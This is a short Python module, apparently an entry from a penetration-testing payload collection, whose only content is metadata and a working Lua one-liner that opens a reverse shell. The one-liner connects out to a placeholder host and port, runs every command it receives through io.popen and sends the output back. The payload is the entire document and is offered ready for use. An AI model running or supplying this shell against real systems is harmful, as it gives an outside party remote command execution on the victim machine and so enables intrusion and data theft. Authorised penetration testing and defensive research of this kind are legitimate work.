class info:
    author      = "Karim shoair (D4Vinci)"
    description = "Use lua only to establish a reverse shell."
    function    = "reverse shell"
    liner       = """lua5.1 -e 'local host, p = "TARGET", PORT local socket = require("socket") local tcp = socket.tcp() local io = require("io") tcp:connect(host, p); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, 'r') local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()'"""
